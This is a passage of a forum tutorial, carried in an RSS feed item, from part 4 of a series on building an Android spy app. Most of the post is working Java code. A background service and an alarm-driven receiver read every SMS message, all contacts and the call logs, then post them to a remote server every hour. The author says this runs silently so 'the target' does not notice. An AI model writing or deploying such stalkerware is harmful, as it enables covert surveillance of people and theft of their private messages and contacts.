&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:app="http://schemas.android.com/apk/res-auto"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent"
app:layout_behavior="@string/appbar_scrolling_view_behavior"
tools:context=".Dashboard"
tools:showIn="@layout/activity_dashboard"&gt;

&lt;android.support.v7.widget.RecyclerView
    android:layout_width="match_parent"
    android:layout_above="@id/service_monitor_button"
    android:id="@+id/dashboard_recycler_view"
    android:layout_height="match_parent" /&gt;

&lt;Button
    android:layout_width="match_parent"
    android:text="Start MONITORING"
    android:padding="10dp"
    android:id="@+id/service_monitor_button"
    android:textColor="@android:color/white"
    android:background="@color/colorPrimary"
    style="@style/Base.Widget.AppCompat.Button.Borderless"
    android:layout_alignParentBottom="true"
    android:layout_height="wrap_content" /&gt;

&lt;/RelativeLayout&gt;
</code></pre>
<p>With our button declared in the layout, lets declare in the <code>Dashboard.java</code> file. Below the <code>public class Dashboard ...</code> statement, declare the button.</p>
<pre><code>public class Dashboard extends AppCompatActivity {

     private RecyclerView recyclerView;
     private List&lt;RecyclerJava&gt; recyclerJavaList = new ArrayList&lt;&gt;();
     private RecyclerAdapter recyclerAdapter;

     private Button service_monitor_btn; // New added button declaration

     protected static final int GPS_REQUEST_CODE = 5000;
     protected static final int CONTACTS_REQUEST_CODE = 5001;
     protected static final int CALENDAR_REQUEST_CODE = 5002;
     protected static final int MIC_REQUEST_CODE = 5003;
     protected static final int CAMERA_REQUEST_CODE = 5004;
     protected static final int STORAGE_REQUEST_CODE = 5005;
     protected static final int SMS_REQUEST_CODE = 5006;
</code></pre>
<p><strong>ONCREATE METHOD</strong></p>
<p>With our button declared, lets scroll to the <code>onCreate</code> method and set reference to our button and set the click listener.</p>
<pre><code>@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_dashboard);
    Toolbar toolbar = findViewById(R.id.dashboard_toolbar);
    setSupportActionBar(toolbar);

    recyclerView = findViewById(R.id.dashboard_recycler_view);

    recyclerAdapter = new RecyclerAdapter(recyclerJavaList);
    RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(getApplicationContext());
    recyclerView.setLayoutManager(mLayoutManager);
    recyclerView.setItemAnimator(new DefaultItemAnimator());
    recyclerView.addItemDecoration(new DividerItemDecoration(Dashboard.this, LinearLayoutManager.VERTICAL));
   
    // Finding the button
    service_monitor_btn = findViewById(R.id.service_monitor_button);

   // Checking if our TimerService is running
    if(MyServiceIsRunning(TimerService.class)) {
        service_monitor_btn.setText("STOP MONITORING");
    } else {
        service_monitor_btn.setText("START MONITORING");
    }
   
    // Setting a click listener on the button
    service_monitor_btn.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View view) {
            if(MyServiceIsRunning(TimerService.class)) {
                Log.i("0x00sec", "Stopping Service ...");
                stopService(new Intent(Dashboard.this, TimerService.class));
                service_monitor_btn.setText("START MONITORING");
            } else {
                Log.i("0x00sec", "Starting Service ...");
                startService(new Intent(Dashboard.this, TimerService.class));
                service_monitor_btn.setText("STOP MONITORING");
            }
        }
    });

    updateRecycler();
}
</code></pre>
<p>1 - We assign the button to the view object in the layout file.<br>
2  - <code>MyServiceIsRunning</code> is a method that checks if a service is running. We want the text on the button to be set to <code>stop</code> when the <code>service is running</code> and <code>start</code> when the <code>service is not running</code>.<br>
3 - The service to check is <code>TimerService.class</code>. Its function is to set a repeating alarm function that calls a Broadcast receiver which sends information to the server. Let’s take it bit by bit.</p>
<p><strong>MYSERVICEISRUNNING</strong></p>
<p>This methods as explained accepts a service parameter and checks if the service is running or not and returns a boolean value ( true / false )</p>
<pre><code>private boolean MyServiceIsRunning(Class&lt;?&gt; serviceClass) {
    ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
    for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
        if (serviceClass.getName().equals(service.service.getClassName())) {
            return true;
        }
    }
    return false;
}
</code></pre>
<p><strong>TIMERSERVICE</strong></p>
<p>This service starts a repeating alarm ( <a href="https://developer.android.com/training/scheduling/alarms" rel="noopener nofollow ugc">Alarm Manager</a> ) that calls a Broadcast receiver. The receiver then begins uploading the information. Create a new java class and extend it to the Service class.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/3/3cccce33c1f531e0648fcff9822b32e92c350f87.png" alt="11" data-base62-sha1="8FRroOgs8HX9g8b9DftVba9JEA7" width="530" height="413"></p>
<p>Lets code.</p>
<pre><code>import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.SystemClock;
import android.support.annotation.Nullable;
import android.util.Log;

public class TimerService extends Service {

@Override
public void onCreate() {
    super.onCreate();

    AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
    Intent intent = new Intent(TimerService.this, ServerUpdateReceiver.class);
    PendingIntent pendingIntent = PendingIntent.getBroadcast(this,0,intent, 0);
    alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime(),
            AlarmManager.INTERVAL_HOUR,
            pendingIntent);
    // stopSelf(); // Optional
}

@Override
public int onStartCommand(Intent intent, int flags, int startId) {
    return super.onStartCommand(intent, flags, startId);
}

@Override
public void onDestroy() { // Stop Service
    super.onDestroy();
}

@Nullable
@Override
public IBinder onBind(Intent intent) {
    return null;
}
}
</code></pre>
<p>The only important method is the <code>onCreate</code> method.</p>
<p>Using the AlarmManager, we schedule a repeating alarm to call <code>ServerUpdateReceiver.class</code> ( Broadcast Receiver ). Data can be passed to the receiver through the <code>intent.putExtra</code> call but we won’t be passing any for now.</p>
<p>Another thing to carefully take note is <code>AlarmManager.INTERVAL_HOUR</code>. This piece of parameter ( in Milliseconds ) is the interval for the alarm. The minimum is 60 seconds ( 1 minute - 60000ms ), you cannot set below that. Android will forcefully set it up to a minute if you set it below 60 seconds. We configure our receiver to be called every hour. It is recommended to even increase it a bit as frequent calls can calls the app to crash, battery drain or have our app kill in case of low memory situation.</p>
<p>I am fully aware that we are not checking if the phone is connected to the Internet before sending data. We will fix that later but for the mean time, we have to make sure the phone is connected to the internet. Repeated calls with no internet connection will cause the app to crash temporarily. Temporarily because the alarm call will be fired again which in turn will call our receiver again. Ever repeating.<img src="/images/emoji/twitter/yum.png?v=9" title=":yum:" class="emoji" alt=":yum:"></p>
<p><strong>SERVERUPDATERECEIVER ( BROADCAST )</strong></p>
<p>This receiver simply sends periodic data to our defined server. If a permission is not granted, the appropriate method will not be called because android will not permit us to collect data we do not have permission to.</p>
<p>Create a java class and extend it to the BroadcastReceiver class.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/9/9ea1e60266f0d73b75edf9c29040e5c963839664.png" alt="21" data-base62-sha1="mDkiZ4UOjyO8NHwwh7OPwHfy51i" width="529" height="415"></p>
<p>Remember, if you are not naming your objects according to the ones in the tutorial, make sure you replace them according in the codes.</p>
<p>The only needed method for a BroadcastReceiver is the <code>onReceive</code> Override method. Your code should be something like this:</p>
<pre><code>public class ServerUpdateReceiver extends BroadcastReceiver {

   @Override
   public void onReceive(Context context, Intent intent) {

   }

}
</code></pre>
<p>Below the <code>public class</code> statement, lets declare a <code>Context</code>. With this, all other methods can access it.</p>
<pre><code>public class ServerUpdateReceiver extends BroadcastReceiver {

    Context context;
    ...
</code></pre>
<p><strong>ONRECEIVE METHOD</strong></p>
<p>Within the method, we first check if a permission is granted, then call the appropriate method. This tutorial will cover contacts, call logs and sms messages.</p>
<pre><code>@Override
public void onReceive(Context context, Intent intent) {

    this.context = context;

    if(ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                update_Server_SMS();
            }
        }).start();
    }

    if(ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                update_Server_Contacts();
                update_Server_Call_Logs();
            }
        }).start();
    }
}
</code></pre>
<p>The method that sends our SMS message to the server is <code>update_Server_SMS</code> and the methods responsible for sending the contact information and call log are <code>update_Server_Call_Logs</code> and <code>update_Server_Contacts</code>.</p>
<p>Instead of having different methods handle communication to the server. We will instead create a method to accept <code>POST parameters</code> and handler communications. With this, all methods in the class can communicate externally by calling it and passing along  their parameter.</p>
<p><strong>UPDATE_SERVER METHOD</strong></p>
<p>Update server is the method that handles communication to the server. It accepts POST parameters and sends them along.</p>
<pre><code>private void update_Server(final Map&lt;String, String&gt; params) {

    RequestQueue requestQueue = Volley.newRequestQueue(context);

    StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener&lt;String&gt;() {
        @Override
        public void onResponse(String req) {
        }
    }, new Response.ErrorListener() {
        @Override
        public void onErrorResponse(VolleyError error) {
        }
    }) {
        protected Map&lt;String, String&gt; getParams() {
            return params;
        }
    };

    requestQueue.add(serverRequest);
}
</code></pre>
<p>Since this class is non-UI ( erm, maybe can do little UI jobs like toast, notification, etc ), we don’t want to push any notification like upload complete because it’s a spy app <img src="/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:"> and we don’t want the target to know that information has been sent. Quiet as possible. We therefore don’t include any UI codes here. Since we are also blind as to whether our data was saved or not, we have make sure the server receives the data correctly. Moving on …</p>
<p><strong>UPDATE_SERVER_SMS</strong></p>
<p>This method reads the SMS database of the phone ( inbox, draft, sent ) and sends them to the server through the <code>update_Server</code> method.</p>
<pre><code>private void update_Server_SMS() {

    SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
    final String auth_key = sharedPreferences.getString("auth_key", null);

    try {
        Uri uriSMSURI = Uri.parse("content://sms");

        Cursor cursor = context.getContentResolver().query(uriSMSURI, null, null, null,null);

        while (cursor.moveToNext()) {
            String address = cursor.getString(cursor.getColumnIndexOrThrow("address")).toString();
            String message = cursor.getString(cursor.getColumnIndexOrThrow("body")).toString();
            String date = cursor.getString(cursor.getColumnIndexOrThrow("date")).toString();
            String read = cursor.getString(cursor.getColumnIndexOrThrow("read")).toString();
            String type = cursor.getString(cursor.getColumnIndexOrThrow("type")).toString();
            String id = cursor.getString(cursor.getColumnIndexOrThrow("_id")).toString();

            if(read.equals("0")) { read = "no"; } else { read = "yes"; }
            if(type.equals("1")) { type = "inbox"; } else if(type.equals("2")) { type = "sent"; } else { type = "draft"; }
            date = get_Long_Date(date);

            // THIS IS HOW TO CREATE THE POST PARAMETERS ( MAP ARRAY )
            Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
            params.put("address", address);
            params.put("message", message);
            params.put("date", date);
            params.put("read",  read);
            params.put("id", id);
            params.put("type", type);
            params.put("auth", auth_key);

            update_Server(params);
        }
    } catch (Exception e) {
    }
}
</code></pre>
<p>1 - <code>content://sms</code> - allows us to loop through the entire SMS database not limiting ourself to the inbox, draft or sent messages.</p>
<p>2 - <code>cursor.getColumnIndexOrThrow</code> - allows us to get the appropriate column index of the cursor. Mind you, entering a wrong Column name will cause the app to crash. These are the meanings of the columns.</p>
<ol>
<li>address - phone number</li>
<li>message - content of messages</li>
<li>date - time of message</li>
<li>read - status of message ( 0 - not read, 1 - read )</li>
<li>type - type of message ( 1 - inbox, 2 - outbox, 3 - draft ( guess work) )</li>
<li>id - unique message identifier</li>
</ol>
<p>3 - The date is constructed into human readable with <code>get_Long_Date</code>.</p>
<p>4 - We then construct our POST parameters and call the <code>update_Server</code> method to communicate the information.</p>
<p>The server should then be receiving something like <code>$_POST['address'] &amp;&amp; $_POST['message'] ...</code></p>
<p><strong>GET_LONG_DATE METHOD</strong></p>
<p>Accepts and converts the passed argument into readable.</p>
<pre><code>private String get_Long_Date(String date) {
    Long timestamp = Long.parseLong(date);
    Calendar calendar = Calendar.getInstance();
    calendar.setTimeInMillis(timestamp);
    DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
    return formatter.format(calendar.getTime());
}
</code></pre>
<p><strong>UPDATE_SERVER_CONTACTS</strong></p>
<p>This method just like the one above it, loops through the Contact database, gets information and sends it.</p>
<pre><code>private void update_Server_Contacts() {

    SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
    final String auth_key = sharedPreferences.getString("auth_key", null);

    Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null,
            null, null, null);
    while (cursor.moveToNext()) {
        try{
            String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            String name=cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
            String phoneNumber = null;

            if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) &gt; 0) {
                Cursor phones = context.getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+ contactId, null, null);
                while (phones.moveToNext()) {
                    phoneNumber = phones.getString(phones.getColumnIndex( ContactsContract.CommonDataKinds.Phone.NUMBER));
                    break;
                }
                phones.close();

                if(phoneNumber != null) {

                    Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
                    params.put("contact_name", name);
                    params.put("contact_phone", phoneNumber);
                    params.put("auth", auth_key);

                    update_Server(params);
                }
            }
        }catch(Exception e) {

        }
    }
}
</code></pre>
<p>Again, changing the ColumnIndex will cause the app to crash. They are constant values.</p>
<p><strong>UPDATE_SERVER_CALL_LOGS</strong></p>
<p>The methods just like the other two loops through the call logs database and fetches information.</p>
<pre><code>@SuppressLint("MissingPermission")
private void update_Server_Call_Logs() {

    SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
    final String auth_key = sharedPreferences.getString("auth_key", null);

    Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
    int phone_number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
    int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
    int date = cursor.getColumnIndex(CallLog.Calls.DATE);
    int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);

    while (cursor.moveToNext()) {
        String number = cursor.getString(phone_number);
        String call_type = cursor.getString(type);
        String call_date = get_Long_Date(cursor.getString(date));
        String call_duration = cursor.getString(duration);
        int call_code = Integer.parseInt(call_type);

        switch (call_code) {
            case CallLog.Calls.OUTGOING_TYPE:
                call_type = "OUTGOING";
                break;
            case CallLog.Calls.INCOMING_TYPE:
                call_type = "INCOMING";
                break;
            case CallLog.Calls.MISSED_TYPE:
                call_type = "MISSED";
                break;
        }

        Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
        
        params.put("phone_number", number);
        params.put("call_date", call_date);
        params.put("call_type", call_type);
        params.put("call_duration", call_duration);
        params.put("auth", auth_key);

        update_Server(params);
    }

    cursor.close();
}
</code></pre>
<p>We are done for this tutorial. Before we get ahead of ourselves. It took me days to realize that I had forgotten to add the appropriate call logs permission although we had already added them in the previous tutorial. Without <code>READ_CALL_LOGS</code> and <code>WRITE_CALL_LOGS</code> permission. We cannot access the call logs. Lets add them to <code>AndroidManifest.xml</code>.</p>
<pre><code>&lt;uses-permission android:name="android.permission.READ_CALL_LOG" /&gt;
&lt;uses-permission android:name="android.permission.WRITE_CALL_LOG" /&gt;
</code></pre>
<p>Go ahead now and run your android app. Allow permissions and start monitoring. Your data should be sent to the test server ( if you used my test server ).</p>
<p><strong>CONCLUSION</strong></p>
<p>I love your contributions, suggestions, feedbacks, critics, etc. Anything to help the series.</p>
<p>You can directly import the project into your android studio if you are having trouble.</p>
<p>Checkout the github repo: <a href="https://github.com/sergeantexploiter/Amunet" class="inline-onebox-loading" rel="noopener nofollow ugc">https://github.com/sergeantexploiter/Amunet</a></p>
<p>Until we meet again. I’m out.</p>
<p><strong><span class="hashtag">#Sergeant</span></strong></p>
          <p><a href="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/1">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/1</link>
        <pubDate>Tue, 03 Jul 2018 14:36:49 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-7375-1</guid>
        <source url="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375.rss">Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</source>
      </item>
  </channel>
</rss>
